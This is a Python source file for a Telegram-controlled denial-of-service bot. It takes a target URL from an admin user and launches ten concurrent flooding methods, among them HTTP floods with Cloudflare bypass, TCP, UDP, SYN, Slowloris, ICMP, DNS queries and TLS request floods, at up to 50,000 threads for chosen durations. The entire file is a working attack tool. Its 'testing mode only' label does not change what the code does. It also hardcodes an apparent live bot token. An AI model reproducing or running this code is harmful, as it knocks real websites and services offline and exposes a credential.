import requests
import time
import threading
import random
import socket
import ssl
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import cloudscraper
from concurrent.futures import ThreadPoolExecutor

TOKEN = "8897529808:AAFOr23D_uNaJy5dGjPcPdvC8D1se9e49nc"
ADMIN_ID = 7898928200

# ==================== ULTRA POWER CONFIG ====================
MAX_THREADS = 50000
attack_active = False
current_target = ""
current_threads = 0
current_duration = 0
user_state = {}
executor = ThreadPoolExecutor(max_workers=MAX_THREADS)

# ==================== CLOUDFLARE BYPASS ====================
def create_cf_session():
    return cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'windows',
            'desktop': True
        }
    )

# ==================== 10 POWERFUL ATTACK METHODS ====================

# 1. HTTP/HTTPS FLOOD
def http_flood(url, stop_event):
    session = create_cf_session()
    headers = {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }
    while not stop_event.is_set():
        try:
            session.get(url + f"?_={random.randint(1,999999)}", headers=headers, timeout=3)
            session.post(url, data={"d": random.randint(1,9999)}, timeout=3)
        except:
            session = create_cf_session()

# 2. TCP FLOOD
def tcp_flood(ip, port, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.connect((ip, port))
            sock.send(random._urandom(65535))
            sock.close()
        except:
            pass

# 3. UDP FLOOD
def udp_flood(ip, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(65535)
    while not stop_event.is_set():
        try:
            for _ in range(100):
                sock.sendto(packet, (ip, port))
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 4. SYN FLOOD
def syn_flood(ip, port, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            packet = random._urandom(40)
            sock.sendto(packet, (ip, port))
        except:
            pass

# 5. SLOWLORIS
def slowloris(ip, port, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
            for i in range(500):
                if stop_event.is_set():
                    break
                sock.send(f"X-Keep: {i}\r\n".encode())
                time.sleep(3)
            sock.close()
        except:
            pass

# 6. ICMP FLOOD
def icmp_flood(ip, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = b'\x08\x00' + random._urandom(1024)
            sock.sendto(packet, (ip, 0))
        except:
            pass

# 7. DNS AMPLIFICATION
def dns_amp(ip, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
    while not stop_event.is_set():
        try:
            sock.sendto(dns_query, (ip, 53))
        except:
            pass

# 8. HTTPS RAPID RESET
def https_flood(ip, port, stop_event):
    while not stop_event.is_set():
        try:
            context = ssl.create_default_context()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            ssl_sock = context.wrap_socket(sock, server_hostname=ip)
            for _ in range(100):
                ssl_sock.send(b"GET / HTTP/1.1\r\n\r\n" * 50)
            ssl_sock.close()
        except:
            pass

# 9. RANDOM PAYLOAD FLOOD
def random_flood(ip, port, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            payload = random._urandom(random.randint(1024, 65535))
            sock.send(payload * 10)
            sock.close()
        except:
            pass

# 10. MULTI-VECTOR (ALL ABOVE)
def multi_vector(url, ip, port, stop_event):
    threads = []
    for _ in range(10):
        t = threading.Thread(target=http_flood, args=(url, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)
        t = threading.Thread(target=tcp_flood, args=(ip, port, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)
        t = threading.Thread(target=udp_flood, args=(ip, port, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)
        t = threading.Thread(target=syn_flood, args=(ip, port, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)
        t = threading.Thread(target=slowloris, args=(ip, port, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)

# ==================== MAIN ATTACK ORCHESTRATOR ====================
def start_attack(url, threads, duration_seconds):
    global attack_active
    attack_active = True
    stop_event = threading.Event()
    
    from urllib.parse import urlparse
    parsed = urlparse(url)
    target_host = parsed.hostname
    target_port = 443 if parsed.scheme == "https" else 80
    target_ip = socket.gethostbyname(target_host)
    
    # Calculate thread distribution
    http_t = threads // 4
    tcp_t = threads // 6
    udp_t = threads // 6
    syn_t = threads // 8
    slow_t = threads // 12
    icmp_t = threads // 10
    dns_t = threads // 10
    https_t = threads // 8
    random_t = threads // 10
    
    print(f"🔥 ULTRA ATTACK: {threads} total threads")
    print(f"   HTTP: {http_t} | TCP: {tcp_t} | UDP: {udp_t} | SYN: {syn_t}")
    print(f"   Slow: {slow_t} | ICMP: {icmp_t} | DNS: {dns_t} | HTTPS: {https_t}")
    
    # Launch all attack types
    for _ in range(http_t):
        threading.Thread(target=http_flood, args=(url, stop_event), daemon=True).start()
    
    for _ in range(tcp_t):
        threading.Thread(target=tcp_flood, args=(target_ip, target_port, stop_event), daemon=True).start()
    
    for _ in range(udp_t):
        threading.Thread(target=udp_flood, args=(target_ip, target_port, stop_event), daemon=True).start()
    
    for _ in range(syn_t):
        threading.Thread(target=syn_flood, args=(target_ip, target_port, stop_event), daemon=True).start()
    
    for _ in range(slow_t):
        threading.Thread(target=slowloris, args=(target_ip, target_port, stop_event), daemon=True).start()
    
    for _ in range(icmp_t):
        threading.Thread(target=icmp_flood, args=(target_ip, stop_event), daemon=True).start()
    
    for _ in range(dns_t):
        threading.Thread(target=dns_amp, args=(target_ip, stop_event), daemon=True).start()
    
    for _ in range(https_t):
        threading.Thread(target=https_flood, args=(target_ip, target_port, stop_event), daemon=True).start()
    
    for _ in range(random_t):
        threading.Thread(target=random_flood, args=(target_ip, target_port, stop_event), daemon=True).start()
    
    # Also launch multi-vector for extra power
    threading.Thread(target=multi_vector, args=(url, target_ip, target_port, stop_event), daemon=True).start()
    
    time.sleep(duration_seconds)
    attack_active = False
    stop_event.set()

# ==================== TELEGRAM COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    user_state[update.effective_user.id] = {"step": "awaiting_target"}
    
    await update.message.reply_text(
        "💀 **ULTRA POWER MODE ACTIVE** 💀\n\n"
        "Send me the target URL:\n"
        "Example: `https://target.com`\n\n"
        "⚡ 50,000 THREADS READY ⚡\n"
        "🔥 10 ATTACK METHODS SIMULTANEOUSLY 🔥\n\n"
        "_Testing mode only_",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return
    
    state = user_state.get(user_id, {})
    message = update.message.text.strip()

    if state.get("step") == "awaiting_target":
        if message.startswith("http"):
            user_state[user_id] = {"step": "awaiting_threads", "target": message}
            
            keyboard = [
                [InlineKeyboardButton("⚡ 5,000 Threads", callback_data="threads_5000")],
                [InlineKeyboardButton("⚡ 10,000 Threads", callback_data="threads_10000")],
                [InlineKeyboardButton("⚡ 25,000 Threads", callback_data="threads_25000")],
                [InlineKeyboardButton("💀 50,000 Threads (MAX)", callback_data="threads_50000")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"🎯 **Target:** `{message}`\n\n"
                f"**Select Thread Power:**",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Send valid URL with http:// or https://")

    elif state.get("step") == "awaiting_custom_duration":
        try:
            duration = int(message)
            user_state[user_id]["duration"] = duration
            user_state[user_id]["step"] = "done"
            
            await update.message.reply_text(
                f"💀 **ULTRA ATTACK STARTING** 💀\n\n"
                f"Target: `{user_state[user_id]['target']}`\n"
                f"Threads: {user_state[user_id]['threads']:,}\n"
                f"Duration: {duration}s\n"
                f"Methods: 10 concurrent\n\n"
                f"🔥 _Engaging max power_ 🔥",
                parse_mode='Markdown'
            )

            def run():
                start_attack(
                    user_state[user_id]['target'],
                    user_state[user_id]['threads'],
                    duration
                )
            
            threading.Thread(target=run, daemon=True).start()

            await asyncio.sleep(duration)
            await update.message.reply_text(
                f"✅ **Attack Complete** ✅\n"
                f"Duration: {duration}s\n"
                f"Threads: {user_state[user_id]['threads']:,}\n\n"
                f"_System cleared_"
            )
        except:
            await update.message.reply_text("❌ Send valid number (seconds):")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ Unauthorized")
        return
    
    data = query.data
    user_state_data = user_state.get(user_id, {})

    if data.startswith("threads_"):
        threads = int(data.split("_")[1])
        user_state[user_id]["threads"] = threads
        user_state[user_id]["step"] = "awaiting_custom_duration"
        
        keyboard = [
            [InlineKeyboardButton("⏱️ 30s (Quick)", callback_data="dur_30")],
            [InlineKeyboardButton("⏱️ 60s (1min)", callback_data="dur_60")],
            [InlineKeyboardButton("⏱️ 300s (5min)", callback_data="dur_300")],
            [InlineKeyboardButton("⏱️ 600s (10min)", callback_data="dur_600")],
            [InlineKeyboardButton("⏱️ 3600s (1hour)", callback_data="dur_3600")],
            [InlineKeyboardButton("📝 Custom (Type)", callback_data="dur_custom")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🎯 Target: `{user_state[user_id]['target']}`\n"
            f"⚡ Threads: {threads:,}\n\n"
            f"**Select Duration:**",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

    elif data.startswith("dur_"):
        duration_map = {
            "dur_30": 30,
            "dur_60": 60,
            "dur_300": 300,
            "dur_600": 600,
            "dur_3600": 3600
        }
        
        if data in duration_map:
            duration = duration_map[data]
            user_state[user_id]["duration"] = duration
            user_state[user_id]["step"] = "done"
            
            await query.edit_message_text(
                f"💀 **ULTRA ATTACK STARTING** 💀\n\n"
                f"Target: `{user_state[user_id]['target']}`\n"
                f"Threads: {user_state[user_id]['threads']:,}\n"
                f"Duration: {duration}s\n"
                f"Methods: HTTP/TCP/UDP/SYN/Slowloris/ICMP/DNS/HTTPS/Random/Multi\n\n"
                f"🔥 _Engaging max power_ 🔥",
                parse_mode='Markdown'
            )

            def run():
                start_attack(
                    user_state[user_id]['target'],
                    user_state[user_id]['threads'],
                    duration
                )
            
            threading.Thread(target=run, daemon=True).start()

            await asyncio.sleep(duration)
            await query.message.reply_text(
                f"✅ **Attack Complete** ✅\n"
                f"Duration: {duration}s completed\n"
                f"Total threads: {user_state[user_id]['threads']:,}\n\n"
                f"_System cleared_"
            )
        
        elif data == "dur_custom":
            user_state[user_id]["step"] = "awaiting_custom_duration"
            await query.edit_message_text(
                "📝 **Type custom duration in seconds:**\n\n"
                "Example: `300` = 5 minutes\n"
                "Example: `3600` = 1 hour\n"
                "Example: `7200` = 2 hours",
                parse_mode='Markdown'
            )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_active
    if update.effective_user.id != ADMIN_ID:
        return
    attack_active = False
    await update.message.reply_text("🛑 **Attack Stopped** 🛑\n\nAll threads terminated.\n_System cleared_", parse_mode='Markdown')

# ==================== MAIN ====================
app = Application.builder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("stop", stop))
app.add_handler(CallbackQueryHandler(button_handler))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

print("💀 ULTRA POWER BOT ACTIVATED 💀")
print(f"⚡ Max Threads: {MAX_THREADS:,}")
print("🔥 10 Attack Methods Ready")
app.run_polling()